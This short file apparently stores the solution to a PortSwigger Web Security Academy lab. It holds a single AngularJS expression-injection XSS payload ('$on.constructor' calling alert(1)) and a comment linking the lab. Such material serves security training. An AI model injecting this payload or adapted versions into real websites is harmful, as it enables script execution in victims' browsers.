// The following XSS payload is meant to solve the following lab:
// https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression

{{$on.constructor('alert(1)')()}}
